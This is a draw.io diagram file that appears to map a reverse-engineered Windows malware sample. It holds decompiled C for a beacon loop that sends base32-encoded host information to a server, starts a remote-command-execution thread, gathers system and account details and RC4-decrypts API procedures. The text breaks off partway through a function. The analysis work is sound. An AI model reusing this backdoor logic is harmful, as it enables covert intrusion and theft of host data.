<mxfile host="app.diagrams.net" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0" version="24.8.2">
  <diagram name="Page-1" id="z8TMenJuWHfGxh3X5ceK">
    <mxGraphModel dx="7745" dy="3825" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="850" pageHeight="1100" math="0" shadow="0">
      <root>
        <mxCell id="0" />
        <mxCell id="1" parent="0" />
        <mxCell id="M72Y2Jye1D7dT9Ai017H-57" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0.25;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="M72Y2Jye1D7dT9Ai017H-55" target="M72Y2Jye1D7dT9Ai017H-23">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-55" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-100" y="5870" width="660" height="980" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-58" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.25;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="M72Y2Jye1D7dT9Ai017H-53" target="M72Y2Jye1D7dT9Ai017H-55">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-53" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="221" y="5390" width="539" height="390" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-49" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="M72Y2Jye1D7dT9Ai017H-46" target="M72Y2Jye1D7dT9Ai017H-23">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-46" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="940" y="5370" width="600" height="500" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-45" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.75;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="M72Y2Jye1D7dT9Ai017H-38" target="M72Y2Jye1D7dT9Ai017H-23">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-38" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="1790" y="4820" width="720" height="1350" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-33" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="90" y="8040" width="610" height="420" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-30" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.25;exitDx=0;exitDy=0;entryX=1;entryY=1;entryDx=0;entryDy=0;" edge="1" parent="1" source="M72Y2Jye1D7dT9Ai017H-23" target="IVjEpb5pE-T4-foRiEZy-6">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="1590" y="6982" />
              <mxPoint x="1590" y="6650" />
              <mxPoint x="2940" y="6650" />
              <mxPoint x="2940" y="4024" />
              <mxPoint x="2069" y="4024" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-28" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="1325" y="7070" width="640" height="2025" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-27" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.25;exitDx=0;exitDy=0;entryX=0.25;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="M72Y2Jye1D7dT9Ai017H-23">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="1510" y="7065" as="targetPoint" />
            <Array as="points">
              <mxPoint x="1375" y="6982" />
              <mxPoint x="1375" y="7020" />
              <mxPoint x="1510" y="7020" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-35" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="M72Y2Jye1D7dT9Ai017H-23" target="M72Y2Jye1D7dT9Ai017H-33">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-23" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="620" y="6650" width="620" height="1330" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-19" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="425" y="4510" width="340" height="260" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-10" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="M72Y2Jye1D7dT9Ai017H-7" target="M72Y2Jye1D7dT9Ai017H-6">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-7" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-1900" y="3140" width="400" height="250" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-4" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-1910" y="3460" width="400" height="370" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-61" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-595" y="3460" width="470" height="380" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-54" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-669" y="1480" width="720" height="1890" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-50" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-470" y="1080" width="560" height="180" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-46" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-2500" y="2805" width="530" height="815" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-42" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-2540" y="1710" width="610" height="930" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-44" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.003;exitY=0.035;exitDx=0;exitDy=0;entryX=1;entryY=0.25;entryDx=0;entryDy=0;exitPerimeter=0;" parent="1" source="IVjEpb5pE-T4-foRiEZy-37" target="IVjEpb5pE-T4-foRiEZy-42" edge="1">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-57" value="Text" style="edgeLabel;html=1;align=center;verticalAlign=middle;resizable=0;points=[];" parent="IVjEpb5pE-T4-foRiEZy-44" vertex="1" connectable="0">
          <mxGeometry x="-0.4828" y="-10" relative="1" as="geometry">
            <mxPoint x="3" as="offset" />
          </mxGeometry>
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-48" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.75;exitDx=0;exitDy=0;entryX=1;entryY=0.25;entryDx=0;entryDy=0;" parent="1" source="IVjEpb5pE-T4-foRiEZy-37" target="IVjEpb5pE-T4-foRiEZy-46" edge="1">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-9" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.25;exitY=1;exitDx=0;exitDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-37" target="M72Y2Jye1D7dT9Ai017H-8">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-37" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-1620" y="1355" width="580" height="1725" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-24" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-390" y="165" width="480" height="430" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-23" value="unsigned int __stdcall processInputNumberAndSetString(int inputNumber, char *outputString)&#xa;{&#xa;  unsigned int returnValue; // eax&#xa;&#xa;  if ( inputNumber == 1 )&#xa;  {&#xa;    returnValue = 0;&#xa;    strcpy(outputString, aSv);&#xa;  }&#xa;  else&#xa;  {&#xa;    returnValue = inputNumber - 2;&#xa;    if ( inputNumber == 2 )&#xa;    {&#xa;      returnValue = strlen(aPxE77y) + 1;&#xa;      qmemcpy(outputString, aPxE77y, returnValue);&#xa;    }&#xa;  }&#xa;  return returnValue;&#xa;}" style="text;whiteSpace=wrap;" parent="1" vertex="1">
          <mxGeometry x="-360" y="255" width="390" height="310" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-31" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.25;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" parent="1" source="IVjEpb5pE-T4-foRiEZy-13" target="IVjEpb5pE-T4-foRiEZy-6" edge="1">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="1590" y="459.9999999999998" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-15" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.75;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-13" target="IVjEpb5pE-T4-foRiEZy-51">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="180" y="785" />
              <mxPoint x="180" y="970" />
              <mxPoint x="-175" y="970" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-13" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="221" y="-40" width="669" height="1100" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-38" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" parent="1" source="IVjEpb5pE-T4-foRiEZy-3" target="IVjEpb5pE-T4-foRiEZy-24" edge="1">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-39" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.25;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" parent="1" source="IVjEpb5pE-T4-foRiEZy-13" target="IVjEpb5pE-T4-foRiEZy-37" edge="1">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="150" y="235" />
              <mxPoint x="150" y="840" />
              <mxPoint x="-590" y="840" />
              <mxPoint x="-590" y="1300" />
              <mxPoint x="-1330" y="1300" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-69" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.75;exitY=1;exitDx=0;exitDy=0;entryX=0.25;entryY=0;entryDx=0;entryDy=0;" parent="1" source="IVjEpb5pE-T4-foRiEZy-13" target="IVjEpb5pE-T4-foRiEZy-66" edge="1">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-75" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.75;exitY=1;exitDx=0;exitDy=0;entryX=0;entryY=0.25;entryDx=0;entryDy=0;" parent="1" source="IVjEpb5pE-T4-foRiEZy-13" target="IVjEpb5pE-T4-foRiEZy-71" edge="1">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-13" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.25;exitY=1;exitDx=0;exitDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-13" target="IVjEpb5pE-T4-foRiEZy-54">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="388" y="1070" />
              <mxPoint x="300" y="1070" />
              <mxPoint x="300" y="1390" />
              <mxPoint x="-309" y="1390" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-14" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.25;exitY=1;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="IVjEpb5pE-T4-foRiEZy-13" target="IVjEpb5pE-T4-foRiEZy-61">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="388" y="1070" />
              <mxPoint x="350" y="1070" />
              <mxPoint x="350" y="3730" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-3" value="void __noreturn SecureNetworkDataTransmissionLoop()&lt;br&gt;{&lt;br&gt;&amp;nbsp; unsigned int currentTimestamp; // eax&lt;br&gt;&amp;nbsp; void *cipherBuffer; // eax&lt;br&gt;&amp;nbsp; int cipherFuncAddress; // eax&lt;br&gt;&amp;nbsp; char *formattedSysInfoPtr; // esi&lt;br&gt;&amp;nbsp; HANDLE remoteCmdExecThread; // eax&lt;br&gt;&amp;nbsp; int payloadBytesSent[2]; // [esp+Ch] [ebp-15E4h] BYREF&lt;br&gt;&amp;nbsp; char preparedMsgBuffer[64]; // [esp+14h] [ebp-15DCh] BYREF&lt;br&gt;&amp;nbsp; struct WSAData wsaData; // [esp+54h] [ebp-159Ch] BYREF&lt;br&gt;&amp;nbsp; char parsedServerResponse[1024]; // [esp+1E4h] [ebp-140Ch] BYREF&lt;br&gt;&amp;nbsp; char currentBytesToSend[1024]; // [esp+5E4h] [ebp-100Ch] BYREF&lt;br&gt;&amp;nbsp; char rawServerResp[1024]; // [esp+9E4h] [ebp-C0Ch] BYREF&lt;br&gt;&amp;nbsp; char prepNetworkMsg[2056]; // [esp+DE4h] [ebp-80Ch] BYREF&lt;br&gt;&amp;nbsp; int cipherBufferAllocStatusFlag; // [esp+15ECh] [ebp-4h]&lt;br&gt;&lt;br&gt;&amp;nbsp; WSAStartup(0x202u, &amp;amp;wsaData);&lt;br&gt;&amp;nbsp; currentTimestamp = time(0);&lt;br&gt;&amp;nbsp; srand(currentTimestamp);&lt;br&gt;&amp;nbsp; cipherBuffer = operator new(0xA8u);&lt;br&gt;&amp;nbsp; payloadBytesSent[1] = (int)cipherBuffer;&lt;br&gt;&amp;nbsp; cipherBufferAllocStatusFlag = 0;&lt;br&gt;&amp;nbsp; if ( cipherBuffer )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; cipherFuncAddress = &lt;font color=&quot;#ff8b26&quot;&gt;RC4DecryptAndLoadProcedures&lt;/font&gt;((int)cipherBuffer);&lt;br&gt;&amp;nbsp; else&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; cipherFuncAddress = 0;&lt;br&gt;&amp;nbsp; cipherBufferAllocStatusFlag = -1;&lt;br&gt;&amp;nbsp; dataBuffer = cipherFuncAddress;&lt;br&gt;&amp;nbsp; &lt;font color=&quot;#00cc00&quot;&gt;processInputNumberAndSetString(1, byte_4075C0);&lt;br&gt;&amp;nbsp; processInputNumberAndSetString(2, socketFlag);&lt;/font&gt;&lt;br&gt;&amp;nbsp; while ( 1 )&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; memset(rawServerResp, 0, sizeof(rawServerResp));&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; memset(parsedServerResponse, 0, sizeof(parsedServerResponse));&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; memset(prepNetworkMsg, 0, 0x800u);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; memset(currentBytesToSend, 0, sizeof(currentBytesToSend));&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; payloadBytesSent[0] = 0;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; formattedSysInfoPtr = &lt;font color=&quot;#47e7ff&quot;&gt;GatherAndFormatSystemInformation&lt;/font&gt;((void *)dataBuffer, (int)rawServerResp, byte_4075C0);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;font color=&quot;#00cc00&quot;&gt;prepare_and_write_message_to_buffer&lt;/font&gt;(preparedMsgBuffer);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;font color=&quot;#ff8b26&quot;&gt;base32_encode&lt;/font&gt;(parsedServerResponse, rawServerResp, (unsigned int)formattedSysInfoPtr);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;font color=&quot;#00cc00&quot;&gt;format_and_append_strings&lt;/font&gt;(prepNetworkMsg, (int)socketFlag, parsedServerResponse);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if ( &lt;font color=&quot;#ff0505&quot;&gt;SendDataOverSecureSocket&lt;/font&gt;(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dataBuffer,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (int)prepNetworkMsg,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (int)socketFlag,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (int)preparedMsgBuffer,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (int)currentBytesToSend,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1024,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; payloadBytesSent)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;amp;&amp;amp; !strcmp(currentBytesToSend, status_success) )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; remoteCmdExecThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&lt;font color=&quot;#ff0505&quot;&gt;RemoteCommandExecution&lt;/font&gt;, 0, 0, 0);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; WaitForSingleObject(remoteCmdExecThread, 0xFFFFFFFF);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; else&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; pause_for_random_time(15000);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ExecuteSocketDataOperations();&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; pause_for_random_time(10000);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp; }&lt;br&gt;}" style="text;html=1;whiteSpace=wrap;overflow=hidden;rounded=0;" parent="1" vertex="1">
          <mxGeometry x="240.5" y="120" width="630" height="930" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-25" value="&lt;h1&gt;Function 1: sub_401760 (SecureNetworkDataTransmissionLoop)&lt;br&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="240" y="-10" width="550" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-33" value="&lt;h1&gt;&lt;font color=&quot;#47e7ff&quot;&gt;Function 4: sub_402EE0() (GatherAndFormatSystemInformation)):&lt;/font&gt;&lt;br&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" parent="1" vertex="1">
          <mxGeometry x="-1600" y="1355" width="580" height="70" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-36" value="char *__thiscall GatherAndFormatSystemInformation(void *this, int outputBuffer, const char *a3)&#xa;{&#xa;  unsigned int hostIp; // esi&#xa;  struct hostent *hostEntity; // eax&#xa;  char *networkAddress; // eax&#xa;  int osVersionMinorNumber; // ecx&#xa;  unsigned int PROCESSOR_System1Length; // kr04_4&#xa;  unsigned int PROCESSOR_System1ActualLength; // ecx&#xa;  char *PROCESOR_System1EndPoint; // ebp&#xa;  unsigned int PROCESSOR_System2Length; // kr08_4&#xa;  unsigned int computerNameLength; // kr0C_4&#xa;  char *ComputerNameStart; // edi&#xa;  unsigned int ComputerNameActualLength; // ecx&#xa;  char *ComputerNameEndPoint; // ebp&#xa;  unsigned int ProcessorTypeLength; // kr10_4&#xa;  unsigned int ProcessorTypeActualLength; // ecx&#xa;  char *ProcessorTypeEndPoint; // ebp&#xa;  unsigned int customSystemDescriptionLength; // kr14_4&#xa;  DWORD computerNameSize; // [esp+10h] [ebp-324h] BYREF&#xa;  CHAR computerName[61]; // [esp+14h] [ebp-320h] BYREF&#xa;  __int16 computerNameUnk1; // [esp+51h] [ebp-2E3h]&#xa;  char computerNameUnk2; // [esp+53h] [ebp-2E1h]&#xa;  char processorType[61]; // [esp+54h] [ebp-2E0h] BYREF&#xa;  __int16 processorTypeUnk1; // [esp+91h] [ebp-2A3h]&#xa;  char processorTypeUnk2; // [esp+93h] [ebp-2A1h]&#xa;  char PROCESSOR_System2[61]; // [esp+94h] [ebp-2A0h] BYREF&#xa;  __int16 PROCESSOR_System2Unk1; // [esp+D1h] [ebp-263h]&#xa;  char PROCESSOR_System2Unk2; // [esp+D3h] [ebp-261h]&#xa;  char PROCESSOR_System1[61]; // [esp+D4h] [ebp-260h] BYREF&#xa;  __int16 PROCESSOR_System1Unk1; // [esp+111h] [ebp-223h]&#xa;  char PROCESSOR_System1Unk2; // [esp+113h] [ebp-221h]&#xa;  char osVersionInformation[284]; // [esp+114h] [ebp-220h] BYREF&#xa;  char hostname[257]; // [esp+230h] [ebp-104h] BYREF&#xa;  __int16 hostnameUnk1; // [esp+331h] [ebp-3h]&#xa;  char hostnameUnk2; // [esp+333h] [ebp-1h]&#xa;&#xa;  memset(hostname, 0, sizeof(hostname));&#xa;  hostnameUnk1 = 0;&#xa;  hostnameUnk2 = 0;&#xa;  *(_BYTE *)outputBuffer = 1;&#xa;  hostIp = 0;&#xa;  if ( !gethostname(hostname, 255) )&#xa;  {&#xa;    hostEntity = gethostbyname(hostname);&#xa;    if ( hostEntity )&#xa;    {&#xa;      networkAddress = inet_ntoa(**(struct in_addr **)hostEntity-&gt;h_addr_list);&#xa;      hostIp = inet_addr(networkAddress);&#xa;      dword_407624 = hostIp;&#xa;    }&#xa;  }&#xa;  *(_DWORD *)(outputBuffer + 1) = hostIp;&#xa;  *(_DWORD *)(outputBuffer + 5) = GetOEMCP();&#xa;  *(_DWORD *)(outputBuffer + 9) = GetTickCount();&#xa;  *(_DWORD *)(outputBuffer + 13) = sub_4031F0(this) == 0;&#xa;  memset(osVersionInformation, 0, sizeof(osVersionInformation));&#xa;  *(_DWORD *)osVersionInformation = 284;&#xa;  GetVersionExW((LPOSVERSIONINFOW)osVersionInformation);&#xa;  osVersionMinorNumber = *(_DWORD *)&amp;osVersionInformation[8];&#xa;  *(_DWORD *)(outputBuffer + 17) = *(_DWORD *)&amp;osVersionInformation[4];&#xa;  *(_DWORD *)(outputBuffer + 21) = osVersionMinorNumber;&#xa;  memset(PROCESSOR_System1, 0, sizeof(PROCESSOR_System1));&#xa;  memset(PROCESSOR_System2, 0, sizeof(PROCESSOR_System2));&#xa;  PROCESSOR_System1Unk1 = 0;&#xa;  PROCESSOR_System1Unk2 = 0;&#xa;  PROCESSOR_System2Unk1 = 0;&#xa;  PROCESSOR_System2Unk2 = 0;&#xa;  *(_BYTE *)(outputBuffer + 25) = osVersionInformation[282];&#xa;  GetAccountNameAndDomainViaSid(PROCESSOR_System1, PROCESSOR_System2);&#xa;  PROCESSOR_System1Length = strlen(PROCESSOR_System1) + 1;&#xa;  *(_WORD *)(outputBuffer + 26) = PROCESSOR_System1Length - 1;&#xa;  PROCESSOR_System1ActualLength = (unsigned __int16)(PROCESSOR_System1Length - 1);&#xa;  qmemcpy((void *)(outputBuffer + 28), PROCESSOR_System1, PROCESSOR_System1ActualLength);&#xa;  PROCESOR_System1EndPoint = (char *)(PROCESSOR_System1ActualLength + outputBuffer + 28 + 2);&#xa;  PROCESSOR_System2Length = strlen(PROCESSOR_System2) + 1;&#xa;  *((_WORD *)PROCESOR_System1EndPoint - 1) = PROCESSOR_System2Length - 1;&#xa;  qmemcpy(PROCESOR_System1EndPoint, PROCESSOR_System2, (unsigned __int16)(PROCESSOR_System2Length - 1));&#xa;  memset(computerName, 0, sizeof(computerName));&#xa;  computerNameUnk1 = 0;&#xa;  computerNameUnk2 = 0;&#xa;  computerNameSize = 64;&#xa;  GetComputerNameA(computerName, &amp;computerNameSize);&#xa;  computerNameLength = strlen(computerName) + 1;&#xa;  ComputerNameStart = &amp;PROCESOR_System1EndPoint[(unsigned __int16)(PROCESSOR_System2Length - 1) + 2];&#xa;  *((_WORD *)ComputerNameStart - 1) = computerNameLength - 1;&#xa;  ComputerNameActualLength = (unsigned __int16)(computerNameLength - 1);&#xa;  ComputerNameEndPoint = &amp;ComputerNameStart[ComputerNameActualLength];&#xa;  qmemcpy(ComputerNameStart, computerName, ComputerNameActualLength);&#xa;  memset(processorType, 0, sizeof(processorType));&#xa;  processorTypeUnk1 = 0;&#xa;  processorTypeUnk2 = 0;&#xa;  QueryAndAppendRegistryValueAndStatus(processorType);&#xa;  ComputerNameEndPoint += 2;&#xa;  ProcessorTypeLength = strlen(processorType) + 1;&#xa;  *((_WORD *)ComputerNameEndPoint - 1) = ProcessorTypeLength - 1;&#xa;  ProcessorTypeActualLength = (unsigned __int16)(ProcessorTypeLength - 1);&#xa;  qmemcpy(ComputerNameEndPoint, processorType, ProcessorTypeActualLength);&#xa;  ProcessorTypeEndPoint = &amp;ComputerNameEndPoint[ProcessorTypeActualLength + 2];&#xa;  customSystemDescriptionLength = strlen(a3) + 1;&#xa;  *((_WORD *)ProcessorTypeEndPoint - 1) = customSystemDescriptionLength - 1;&#xa;  qmemcpy(ProcessorTypeEndPoint, a3, (unsigned 